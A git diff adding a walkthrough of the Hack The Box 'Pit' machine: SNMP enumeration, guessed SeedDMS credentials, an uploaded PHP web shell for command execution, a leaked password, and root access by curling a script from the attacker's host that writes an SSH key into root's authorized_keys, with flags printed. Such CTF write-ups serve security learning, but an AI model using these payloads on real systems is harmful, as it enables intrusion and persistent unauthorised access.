@@ -4,12 +4,22 @@ Linux, 30 Base Points, Medium
 ## Machine
 
 ![‏‏Pit.JPG](images/Pit.JPG)
- 
+
+## TL;DR
+
+To solve this machine, we begin by enumerating open services using ```namp``` – finding ports ```22```, ```80``` and ```9090```.
+
+***User***: Using ```nmap``` UDP port scanning we found another two ports ```161``` and ```500```, On the following [Twitter post](https://twitter.com/hackthebox_eu/status/1392494135421120516) related to this machine we found a hint about ```snmapwalk``` use, Using ```snmpwalk``` we found another website portal on port ```80``` and username ```michelle```, Found the portal credentials to SeedDMS 5.1.15 system, And by using [SeedDMS versions < 5.1.11 - Remote Command Execution](https://www.exploit-db.com/exploits/47022) we get the user flag.
+
+***Root***: From ```snmpwalk``` we found script ```/usr/bin/monitor```, The script running script located on ```/usr/local/monitoring/``` directory, By creating a script which adds our ```SSH``` private key to root ```authorized_keys``` we get the root flag.
+
+![pwn.JPG](images/pwn.JPG)
+
 ## Pit Solution
 
 ### User
 
-So let's start with ```nmap``` scanning:
+Let's start with ```nmap``` scanning:
 
 ```console
 ┌─[evyatar@parrot]─[/hackthebox/Pit]
@@ -117,19 +127,194 @@ Nmap done: 1 IP address (1 host up) scanned in 214.52 seconds
 
 ```
 
-Let's add the domains ```dms-pit.htb```, ```pit.htb``` to ```/etc/hosts``` and browse to ports 9090 and 80.
+Let's browse ports ```9090``` and ```80``` (add ```dms-pit.htb```, ```pit.htb``` domains to ```/etc/hosts```).
 
-Port 80 [http://10.10.10.241/](http://10.10.10.241/):
+Port ```80``` [http://10.10.10.241/](http://10.10.10.241/) contains the following web site:
 
 ![port80.JPG](images/port80.JPG)
 
-Port 9090 [https://dms-pit.htb:9090/](https://dms-pit.htb:9090/):
+Port ```9090``` [https://dms-pit.htb:9090/](https://dms-pit.htb:9090/) contains:
 
 ![port9090.JPG](images/port9090.JPG)
 
+Nothing juicy on both websites.
 
-## Pit is still active machine - [Full writeup](Pit-Writeup.pdf) avaliable with root hash password only.
+Let's try to scan UDP ports:
+```console
+┌─[evyatar@parrot]─[/hackthebox/Pit]
+└──╼ $ sudo nmap -sU -F 10.10.10.241
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-18 17:03 IDT
+Nmap scan report for dms-pit.htb (10.10.10.241)
+Host is up (0.082s latency).
+Not shown: 98 open|filtered ports
+PORT    STATE    SERVICE
+161/udp open     snmp
+500/udp filtered isakmp
 
-Telegram: [@evyatar9](https://t.me/evyatar9)
+Nmap done: 1 IP address (1 host up) scanned in 7.65 seconds
 
-Discord: [evyatar9](https://discordapp.com/users/812805349815091251)
+```
+
+We found another port ```161``` which is ```snmp``` service behind.
+
+By looking at [Twitter post](https://twitter.com/hackthebox_eu/status/1392494135421120516) related to this machine we can get A hint for the next step:
+![twitter.JPG](images/twitter.JPG)
+
+Follow the hint, Let's  use [snmpwalk](https://linux.die.net/man/1/snmpwalk):
+```console
+┌─[evyatar@parrot]─[/hackthebox/Pit]
+└──╼ $ snmpwalk -v 1 -c public 10.10.10.241 .1 > walk.out
+┌─[evyatar@parrot]─[/hackthebox/Pit]
+└──╼ $ cat walk.out
+...
+guest_u         user       s0         s0                             guest_r
+root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
+staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
+sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
+system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
+unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
+user_u          user       s0         s0                             user_r
+xguest_u        user       s0         s0                             xguest_r
+login
+
+Login Name           SELinux User         MLS/MCS Range        Service
+
+__default__          unconfined_u         s0-s0:c0.c1023       *
+michelle             user_u               s0                   *
+root                 unconfined_u         s0-s0:c0.c1023       *
+System uptime
+ 10:30:57 up 17:41,  0 users,  load average: 0.00, 0.00, 0.00"
+iso.3.6.1.4.1.8072.1.3.2.3.1.3.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 31
+iso.3.6.1.4.1.8072.1.3.2.3.1.4.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 0
+iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.1 = STRING: "Memory usage"
+...
+iso.3.6.1.4.1.2021.9.1.1.1 = INTEGER: 1
+iso.3.6.1.4.1.2021.9.1.1.2 = INTEGER: 2
+iso.3.6.1.4.1.2021.9.1.2.1 = STRING: "/"
+iso.3.6.1.4.1.2021.9.1.2.2 = STRING: "/var/www/html/seeddms51x/seeddms"
+iso.3.6.1.4.1.2021.9.1.3.1 = STRING: "/dev/mapper/cl-root"
+iso.3.6.1.4.1.2021.9.1.3.2 = STRING: "/dev/mapper/cl-seeddms"
+iso.3.6.1.4.1.2021.9.1.4.1 = INTEGER: 10000
+iso.3.6.1.4.1.2021.9.1.4.2 = INTEGER: 100000
+....
+```
+
+As we can see, we get username ```michelle```, And also another webpage that is located on ```/var/www/html/seeddms51x/seeddms```.
+
+Let's try to observe the URL: [http://dms-pit.htb/seeddms51x/seeddms](http://dms-pit.htb/seeddms51x/seeddms):
+
+![seeddms.JPG](images/seeddms.JPG)
+
+After few tries, found the following credentials ```michelle:michelle``` work, We can access the dashboard:
+![dashboard.JPG](images/dashboard.JPG)
+
+We can see the Administrator notes:
+>Dear colleagues, Because of security issues in the previously installed version (5.1.10), I upgraded SeedDMS to version 5.1.15. See the attached CH...
+
+According to the admin notes -  we are dealing with SeedDMS 5.1.15 which we can found the following RCE [https://www.exploit-db.com/exploits/47022](https://www.exploit-db.com/exploits/47022).
+
+First, Let's browse this link to add a new document [http://dms-pit.htb/seeddms51x/seeddms/out/out.AddDocument.php?folderid=8&showtree=1](http://dms-pit.htb/seeddms51x/seeddms/out/out.AddDocument.php?folderid=8&showtree=1):
+
+![newdoc.JPG](images/newdoc.JPG)
+
+```pshell.php``` file contains the follow:
+```php
+<?php
+
+if(isset($_REQUEST['cmd'])){
+        echo "<pre>";
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo "</pre>";
+        die;
+}
+
+?>
+```
+
+
+Next, We can get the document id by clicking on the document link and hover on the Download button:
+![hover.JPG](images/hover.JPG)
+
+Now, We can get RCE by browsing the following link [http://dms-pit.htb/seeddms51x/data/1048576/30/1.php?cmd=cat+/etc/passwd](http://dms-pit.htb/seeddms51x/data/1048576/30/1.php?cmd=cat+/etc/passwd):
+![RCE.JPG](images/RCE.JPG)
+
+By accessing to [view-source:http://dms-pit.htb/seeddms51x/data/1048576/33/1.php?cmd=cat%20/var/www/html/seeddms51x/conf/settings.xml](view-source:http://dms-pit.htb/seeddms51x/data/1048576/33/1.php?cmd=cat%20/var/www/html/seeddms51x/conf/settings.xml)
+
+We can get the following credentials:
+![creds.JPG](images/creds.JPG)
+
+So we can access port 9090 [https://dms-pit.htb:9090/](https://dms-pit.htb:9090/) with the following creds: ```michelle:ied^ieY6xoquu``` and we get the following:
+![cockpit.JPG](images/cockpit.JPG)
+
+By clicking on Terminal we can get the user flag:
+![user.JPG](images/user.JPG)
+
+And we get the user flag ```e1020e71e1b0da2c33c36d460b8f3f89```.
+
+
+### Root
+
+```snmpwalk``` give us also the following information:
+```console
+iso.3.6.1.4.1.2021.9.1.16.1 = Gauge32: 0
+iso.3.6.1.4.1.2021.9.1.16.2 = Gauge32: 0
+iso.3.6.1.4.1.2021.9.1.100.1 = INTEGER: 0
+iso.3.6.1.4.1.2021.9.1.100.2 = INTEGER: 1
+iso.3.6.1.4.1.8072.1.3.2.1.0 = INTEGER: 1
+iso.3.6.1.4.1.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 = STRING: "/usr/bin/monitor"
+iso.3.6.1.4.1.8072.1.3.2.2.1.3.10.109.111.110.105.116.111.114.105.110.103 = ""
+iso.3.6.1.4.1.8072.1.3.2.2.1.4.10.109.111.110.105.116.111.114.105.110.103 = ""
+iso.3.6.1.4.1.8072.1.3.2.2.1.5.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 5
+iso.3.6.1.4.1.8072.1.3.2.2.1.6.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 1
+iso.3.6.1.4.1.8072.1.3.2.2.1.7.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 1
+```
+
+Let's try to observe this file ```/usr/bin/monitor```:
+```bash
+#!/bin/bash
+
+for script in /usr/local/monitoring/check*sh
+do
+    /bin/bash $script
+done
+```
+
+Let's create script called ```check_me.sh``` which contains:
+```bash
+#!/bin/bash
+
+echo "ssh-rsa <SSH_PUBLIC_KEY> evyatar@parrot" > /root/.ssh/authorized_keys
+```
+
+The script adds our public key to ```root``` authorized_keys.
+
+Let's upload this script to ```/usr/local/monitoring/``` using ```curl```:
+```console
+[michelle@pit monitoring]$ pwd
+/usr/local/monitoring
+[michelle@pit monitoring]$ curl http://10.10.14.14:8000/check_me.sh -o check_me.sh
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   601  100   601    0     0   3756      0 --:--:-- --:--:-- --:--:--  3756
+[michelle@pit monitoring]$ 
+```
+
+Now, Let's run again ```snmpwalk``` command: ```snmpwalk -v 1 -c public 10.10.10.241 .1``` to execute the script above.
+
+When It's done we can make ```SSH``` login as root using our ```SSH``` private key:
+```console
+┌─[evyatar@parrot]─[/hackthebox/Pit]
+└──╼ $ ssh -i id_rsa root@10.10.10.241
+Web console: https://pit.htb:9090/
+
+Last login: Mon May 10 11:42:46 2021
+[root@pit ~]# whoami
+root
+[root@pit ~]# cat root.txt
+0730dc58aa29524e312f7983c0316f1d
+[root@pit ~]# 
+
+```
+
+And we get the root flag ```0730dc58aa29524e312f7983c0316f1d```.
